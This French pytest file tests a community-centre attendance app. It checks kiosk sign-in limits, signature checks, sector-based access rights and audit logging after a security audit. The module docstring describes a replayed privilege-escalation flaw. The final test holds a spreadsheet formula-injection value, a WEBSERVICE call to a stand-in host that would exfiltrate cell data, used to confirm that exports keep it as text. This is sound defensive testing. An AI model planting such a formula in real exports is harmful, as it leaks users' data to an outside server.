"""Kiosque et droits (audit C3, 1.1, 1.2, 5.1, 5.2, 5.5).

C3 rejoué : avec le lien d'une séance du secteur A, on faisait émarger sans
signature une personne du secteur B ; la fausse présence ouvrait alors à A
la lecture, la modification, la suppression et l'anonymisation de sa fiche.

Règles désormais :
- le kiosque n'émarge que les personnes proposées à CE navigateur, et
  seulement avec une vraie signature ;
- une présence posée au kiosque ouvre la LECTURE de la fiche au secteur,
  pas la modification, tant que l'équipe ne l'a pas validée ;
- supprimer ou anonymiser : secteur qui a créé la fiche (ou portée structure).
"""
import base64
import uuid
from io import BytesIO

import pytest
from conftest import kiosque_emarger, signature_tracee

MDP = "motdepasse-tests"


def _png(couleur="white", trait=False, mode="RGB"):
    from PIL import Image, ImageDraw
    image = Image.new(mode, (200, 80), couleur)
    if trait:
        ImageDraw.Draw(image).line((10, 40, 190, 45), fill=(0, 0, 0, 255) if mode == "RGBA" else (0, 0, 0), width=2)
    tampon = BytesIO()
    image.save(tampon, "PNG")
    return "data:image/png;base64," + base64.b64encode(tampon.getvalue()).decode()


@pytest.fixture
def monde(app):
    """Deux secteurs, une séance ouverte au kiosque en Numérique, une fiche
    créée par l'EPE, et les comptes des deux secteurs."""
    from app.extensions import db
    from app.models import AtelierActivite, Participant, Role, SessionActivite, User
    from app.utils.dates import utcnow
    cle = uuid.uuid4().hex[:8]
    with app.app_context():
        atelier = AtelierActivite(nom=f"Atelier {cle}", secteur="Numérique")
        db.session.add(atelier)
        db.session.flush()
        s = SessionActivite(atelier_id=atelier.id, secteur="Numérique", session_type="COLLECTIF",
                            kiosk_open=True, kiosk_opened_at=utcnow(), kiosk_token=f"tok{cle}")
        cible = Participant(nom=f"Epe{cle}", prenom="Fiche", created_secteur="EPE")
        db.session.add_all([s, cible])
        comptes = {}
        for code, secteur in (("animateur", "Numérique"), ("responsable_secteur", "Numérique"),
                              ("responsable_secteur", "EPE")):
            email = f"{code}-{secteur}-{cle}@test.fr".lower()
            u = User(email=email, nom=code, secteur_assigne=secteur)
            u.set_password(MDP)
            u.roles.append(Role.query.filter_by(code=code).one())
            db.session.add(u)
            comptes[(code, secteur)] = email
        db.session.commit()
        return {"token": s.kiosk_token, "sid": s.id, "pid": cible.id, "nom": cible.nom, "comptes": comptes}


def _connexion(app, email):
    c = app.test_client()
    c.post("/", data={"email": email, "password": MDP})
    return c


def _presence(app, sid, pid):
    from app.models import PresenceActivite
    with app.app_context():
        return PresenceActivite.query.filter_by(session_id=sid, participant_id=pid).first()


# ---------------------------------------------------------------------------
# Kiosque : qui peut être émargé
# ---------------------------------------------------------------------------

def test_kiosque_refuse_un_identifiant_non_propose(app, monde):
    client = app.test_client()
    r = client.post(f"/kiosk/session/{monde['token']}", data={
        "action": "emarger", "participant_id": monde["pid"], "signature_data": signature_tracee()})
    assert r.status_code == 302
    assert _presence(app, monde["sid"], monde["pid"]) is None


def test_kiosque_emarge_apres_recherche_avec_origine_kiosque(app, monde):
    client = app.test_client()
    r = kiosque_emarger(client, monde["token"], monde["pid"], monde["nom"])
    assert r.status_code == 200
    pr = _presence(app, monde["sid"], monde["pid"])
    assert pr is not None and pr.origine == "kiosque" and pr.signature_path


def test_proposition_ne_vaut_que_pour_ce_navigateur(app, monde):
    """Chercher sur une tablette n'autorise pas un autre appareil à émarger."""
    app.test_client().get(f"/kiosk/session/{monde['token']}/search", query_string={"q": monde["nom"]})
    autre = app.test_client()
    autre.post(f"/kiosk/session/{monde['token']}", data={
        "action": "emarger", "participant_id": monde["pid"], "signature_data": signature_tracee()})
    assert _presence(app, monde["sid"], monde["pid"]) is None


@pytest.mark.parametrize("signature", ["", None, "blanc", "transparent"])
def test_kiosque_exige_une_vraie_signature(app, monde, signature):
    donnees = {"blanc": _png(), "transparent": _png((0, 0, 0, 0), mode="RGBA")}.get(signature, signature)
    client = app.test_client()
    client.get(f"/kiosk/session/{monde['token']}/search", query_string={"q": monde["nom"]})
    data = {"action": "emarger", "participant_id": monde["pid"]}
    if donnees is not None:
        data["signature_data"] = donnees
    client.post(f"/kiosk/session/{monde['token']}", data=data)
    assert _presence(app, monde["sid"], monde["pid"]) is None


def test_bouton_c_est_moi_preremplit_la_personne_proposee(app, monde):
    """Mineur de l'audit : « C'est moi » (doublon proposé) restait sans effet."""
    client = app.test_client()
    client.get(f"/kiosk/session/{monde['token']}/search", query_string={"q": monde["nom"]})
    page = client.get(f"/kiosk/session/{monde['token']}?highlight={monde['pid']}").get_data(as_text=True)
    assert monde["nom"] in page


# ---------------------------------------------------------------------------
# 5.2 : pointée à l'avance par l'animateur, puis signature au kiosque
# ---------------------------------------------------------------------------

def test_signature_kiosque_completee_sur_un_pointage_existant(app, monde):
    from app.extensions import db
    from app.models import PresenceActivite
    with app.app_context():
        db.session.add(PresenceActivite(session_id=monde["sid"], participant_id=monde["pid"],
                                        presence_type="absent_excuse"))
        db.session.commit()
    r = kiosque_emarger(app.test_client(), monde["token"], monde["pid"], monde["nom"])
    assert "bon" in r.get_data(as_text=True).lower()
    with app.app_context():
        presences = PresenceActivite.query.filter_by(session_id=monde["sid"], participant_id=monde["pid"]).all()
        assert len(presences) == 1
        assert presences[0].signature_path
        assert presences[0].origine is None  # reste une présence du personnel
        assert presences[0].presence_type == "present"  # finalement venue


def test_deja_signe_reste_refuse(app, monde):
    client = app.test_client()
    kiosque_emarger(client, monde["token"], monde["pid"], monde["nom"])
    premiere = _presence(app, monde["sid"], monde["pid"]).signature_path
    r = kiosque_emarger(client, monde["token"], monde["pid"], monde["nom"])
    assert r.status_code == 302
    assert _presence(app, monde["sid"], monde["pid"]).signature_path == premiere


# ---------------------------------------------------------------------------
# C3 : une présence de kiosque n'ouvre pas les droits d'un secteur
# ---------------------------------------------------------------------------

def test_presence_kiosque_ouvre_la_lecture_pas_la_modification(app, monde):
    from app.extensions import db
    from app.models import Participant
    kiosque_emarger(app.test_client(), monde["token"], monde["pid"], monde["nom"])
    anim = _connexion(app, monde["comptes"][("animateur", "Numérique")])
    assert anim.get(f"/participants/{monde['pid']}/synthese").status_code == 200
    assert anim.post(f"/participants/{monde['pid']}/edit", data={"nom": "Pirate", "prenom": "X"}).status_code == 403
    resp = _connexion(app, monde["comptes"][("responsable_secteur", "Numérique")])
    assert resp.post(f"/participants/{monde['pid']}/anonymize").status_code == 403
    assert resp.post(f"/participants/{monde['pid']}/delete",
                     data={"confirmation_nom": monde["nom"]}).status_code == 403
    with app.app_context():
        p = db.session.get(Participant, monde["pid"])
        assert p is not None and p.nom == monde["nom"]


def test_validation_par_l_equipe_ouvre_la_modification_jamais_la_destruction(app, monde):
    from app.extensions import db
    from app.models import AuditLog, Participant
    kiosque_emarger(app.test_client(), monde["token"], monde["pid"], monde["nom"])
    resp = _connexion(app, monde["comptes"][("responsable_secteur", "Numérique")])
    pr_id = _presence(app, monde["sid"], monde["pid"]).id
    page = resp.get(f"/activite/session/{monde['sid']}/emargement").get_data(as_text=True)
    assert "valider_presence" in page
    resp.post(f"/activite/session/{monde['sid']}/emargement", data={"action": "valider_presence", "presence_id": pr_id})
    assert _presence(app, monde["sid"], monde["pid"]).origine is None
    with app.app_context():
        assert AuditLog.query.filter_by(action="presence.valider").count() >= 1
    anim = _connexion(app, monde["comptes"][("animateur", "Numérique")])
    anim.post(f"/participants/{monde['pid']}/date-naissance", data={"date_naissance": "1990-01-01"})
    with app.app_context():
        assert str(db.session.get(Participant, monde["pid"]).date_naissance) == "1990-01-01"
    assert resp.post(f"/participants/{monde['pid']}/anonymize").status_code == 403


def test_secteur_createur_peut_anonymiser(app, monde):
    from app.extensions import db
    from app.models import Participant
    epe = _connexion(app, monde["comptes"][("responsable_secteur", "EPE")])
    r = epe.post(f"/participants/{monde['pid']}/anonymize")
    assert r.status_code == 302
    with app.app_context():
        assert db.session.get(Participant, monde["pid"]).nom.startswith("ANONYME")


def test_pointage_par_l_equipe_hors_secteur_est_journalise(app, monde):
    from app.models import AuditLog
    resp = _connexion(app, monde["comptes"][("responsable_secteur", "Numérique")])
    resp.post(f"/activite/session/{monde['sid']}/emargement", data={"action": "emarger", "participant_id": monde["pid"]})
    pr = _presence(app, monde["sid"], monde["pid"])
    assert pr is not None and pr.origine is None and not pr.signature_path
    with app.app_context():
        assert AuditLog.query.filter_by(action="presence.hors_secteur",
                                        cible=f"session #{monde['sid']} · participant #{monde['pid']}").count() == 1


def test_pointage_equipe_avec_cadre_vierge_reste_sans_signature(app, monde):
    """Le personnel peut pointer sans faire signer : un cadre vierge n'est pas une erreur."""
    resp = _connexion(app, monde["comptes"][("responsable_secteur", "Numérique")])
    resp.post(f"/activite/session/{monde['sid']}/emargement", data={
        "action": "emarger", "participant_id": monde["pid"], "signature_data": _png((0, 0, 0, 0), mode="RGBA")})
    pr = _presence(app, monde["sid"], monde["pid"])
    assert pr is not None and not pr.signature_path


# ---------------------------------------------------------------------------
# 1.1 et 1.2
# ---------------------------------------------------------------------------

def test_creation_de_fiche_exige_le_droit(app):
    from app.extensions import db
    from app.models import Participant, User
    email = f"sansrole-{uuid.uuid4().hex[:6]}@test.fr"
    with app.app_context():
        u = User(email=email, nom="Sans role")
        u.set_password(MDP)
        db.session.add(u)
        db.session.commit()
    c = _connexion(app, email)
    nom = f"Intrus{uuid.uuid4().hex[:6]}"
    assert c.post("/participants/new", data={"nom": nom, "prenom": "X", "force_creation": "1"}).status_code == 403
    with app.app_context():
        assert Participant.query.filter_by(nom=nom).count() == 0


def test_ancienne_anonymisation_est_complete_et_journalisee(app, admin_client):
    import datetime as dt
    from app.extensions import db
    from app.models import AuditLog, Participant
    with app.app_context():
        p = Participant(nom=f"Legacy{uuid.uuid4().hex[:6]}", prenom="Anne", created_secteur="Numérique",
                        date_naissance=dt.date(1980, 5, 4), email="anne@test.fr")
        db.session.add(p)
        db.session.commit()
        pid = p.id
    admin_client.post(f"/activite/participant/{pid}/anonymize")
    with app.app_context():
        p = db.session.get(Participant, pid)
        assert p.nom.startswith("ANONYME") and p.date_naissance is None and p.email is None
        assert AuditLog.query.filter_by(action="participant.anonymize", cible=f"participant #{pid}").count() == 1


def test_ancienne_suppression_rapide_ne_supprime_plus(app, admin_client):
    from app.extensions import db
    from app.models import Participant
    with app.app_context():
        p = Participant(nom=f"Garde{uuid.uuid4().hex[:6]}", prenom="B", created_secteur="Numérique")
        db.session.add(p)
        db.session.commit()
        pid = p.id
    r = admin_client.post(f"/activite/participant/{pid}/delete")
    assert r.status_code == 302 and f"/participants/{pid}/edit" in r.headers["Location"]
    with app.app_context():
        assert db.session.get(Participant, pid) is not None


# ---------------------------------------------------------------------------
# 5.5 et 5.1
# ---------------------------------------------------------------------------

def test_service_signature_vide(tmp_path):
    from app.services.signatures import save_signature
    with pytest.raises(ValueError, match="vide"):
        save_signature(_png(), tmp_path, "sig")
    assert save_signature(_png(), tmp_path, "sig", vide_autorise=True) is None
    assert save_signature(_png(trait=True), tmp_path, "sig")
    assert save_signature(_png((0, 0, 0, 0), trait=True, mode="RGBA"), tmp_path, "sig")
    assert len(list(tmp_path.iterdir())) == 2


def test_exports_excel_sans_formule_injectee(app):
    """Un nom « =WEBSERVICE(…) » saisi au kiosque reste du texte dans Excel."""
    from openpyxl import Workbook, load_workbook
    from app.utils.xlsx_safe import Formule
    wb = Workbook()
    ws = wb.active
    ws.append(['=WEBSERVICE("http://exemple/?"&C2)', "Dupont", 12])
    ws["D1"] = Formule("=SUM(C1:C1)")
    ws["E1"] = "=1+1"
    assert ws["A1"].data_type == "s" and ws["E1"].data_type == "s"
    assert ws["D1"].data_type == "f"
    tampon = BytesIO()
    wb.save(tampon)
    relu = load_workbook(BytesIO(tampon.getvalue())).active
    assert relu["A1"].data_type == "s" and relu["A1"].value.startswith("=WEBSERVICE")
    assert relu["D1"].data_type == "f"
